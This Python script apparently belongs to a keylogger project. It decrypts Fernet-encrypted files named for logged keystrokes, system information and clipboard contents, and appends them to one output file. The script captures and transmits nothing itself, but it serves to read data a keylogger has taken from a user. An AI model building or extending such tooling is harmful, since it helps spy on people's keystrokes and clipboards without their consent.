from cryptography.fernet import Fernet
import os

from dotenv import load_dotenv
load_dotenv()

key = os.environ.get("ENCRYPTION_KEY")

#Encrypted file names
keys_info_e = 'e_keys_log.txt'
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'

encrypted_files = [keys_info_e, system_info_e, clipboard_info_e]
cnt = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[cnt], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    cnt += 1